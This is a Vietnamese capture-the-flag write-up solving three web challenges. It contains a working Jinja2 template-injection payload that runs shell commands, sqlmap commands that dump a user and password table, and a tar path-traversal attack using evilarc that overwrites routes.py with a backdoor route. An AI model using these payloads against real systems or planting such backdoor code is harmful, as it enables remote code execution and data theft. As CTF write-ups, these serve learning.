# universe (Bài league of legend theme)
- Bài này bị server side template injection 
- Chúng ta có thể test {{1+1}} -> Print ra 2
- Payload: 
    {{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}}

Flag: PISCTF{s0_3zsy_SSTI_F0R_K1d}
# sql-route
- Bài này chúng ta có thể dùng sqlmap vào Post endpoint để tìm lỗ hổng

Check sơ bộ:
   `sqlmap --dbms=mysql -u "http://54.169.55.172:1001/" --data "username=*" --dbs --level=5 --risk=3`

Sau khi biết được tên của db:
`sqlmap --dbms=mysql -u "http://54.169.55.172:1001/" --data "username=admin" -D "ctf" --tables`

Dump data:
`sqlmap --dbms=mysql -u "http://54.169.55.172:1001/" --data "username=admin" -D "ctf" -T "flag" --dump`
+----+------------+-------------------+----------+
| id | pass       | email             | username |
+----+------------+-------------------+----------+
| 1  | superpass  | jean@gmail.net    | jean     |
| 2  | mypass     | michael@gmail.net | michael  |
| 3  | qs89QdAs9A | admin@gmail.net   | admin    |
+----+------------+-------------------+----------+
Flag: PISCTF{qs89QdAs9A}
# firmware
- Thoạt đầu nhìn vô bài này thì tricky hơn các bài trên, nhưng chúng ta có thể đoán được là mình cần tạo payload bằng file tar.gz để inject
- Phân tích code:

```python
import tarfile, tempfile, os
from application import main

generate = lambda x: os.urandom(x).hex()

def extract_from_archive(file):
    tmp  = tempfile.gettempdir()
    path = os.path.join(tmp, file.filename)
    file.save(path)
    print(f'TMP: {tmp}' , flush=True)
    if tarfile.is_tarfile(path):
        tar = tarfile.open(path, 'r:gz')
        tar.extractall(tmp) <-- Vulnerbility ở đây

        extractdir = f'{main.app.config["UPLOAD_FOLDER"]}/{generate(15)}'
        os.makedirs(extractdir, exist_ok=True)

        extracted_filenames = []
        print(f'Tar: {tar}', flush=True)

        for tarinfo in tar:
            name = tarinfo.name
            print(f'Name: {name}', flush=True)
            if tarinfo.isreg():
                filename = f'{extractdir}/{name}'
                os.rename(os.path.join(tmp, name), filename)
                extracted_filenames.append(filename)
                continue
            
            os.makedirs(f'{extractdir}/{name}', exist_ok=True)

        tar.close()
        return extracted_filenames

    return False
```

- Và nghiên cứu thêm, thì tarfile có lỗ hổng bảo mật khi không check path traversal
nên chúng ta có thể có file tar với folder như "../../../abc/abc" thì lúc gọi extractall, nó sẽ extract vô folder mà ta muốn
- Vậy thì ý tưởng là chúng ta sẽ ghi đè 1 file trong application, ở đây mình ghi đè file routes.py, để mở backdoor cho chúng ta lấy flag


    from flask import Blueprint, request, render_template, abort, render_template_string
    from application.util import extract_from_archive
    
    web = Blueprint('web', __name__)
    api = Blueprint('api', __name__)
    
    @web.route('/')
    def index():
        return render_template('index.html')
    
    @api.route('/unslippy', methods=['POST'])
    def cache():
        if 'file' not in request.files:
            return abort(400)
        
        extraction = extract_from_archive(request.files['file'])
        if extraction:
            return {"list": extraction}, 200
    
        return '', 204
    
    @web.route('/exec')
    def run_cmd():
        try:
            return render_template_string(request.args.get('cmd'))
        except:
            return "Exit"
Sau đó làm sao để forge file tar, thì sau khi Google 1 hồi mình tìm có 2 cách:
- 1 là dùng absolute name trong tar trên kali
- 2 dùng script: https://github.com/ptoomey3/evilarc

Câu lệnh như sau:
- ``python evilarc.py routes.py -o unix -f flag.tar.gz -p ../../../../../../../../app/application/blueprints/ -d 0 ``

Sau khi có dc file tar, chúng ta upload lên và có được đường link /exec để backdoor,
Cách thức lấy flag tương tự bài 1
Flag: PISCTF{p1s_f1rmvv@r3_7l@g}
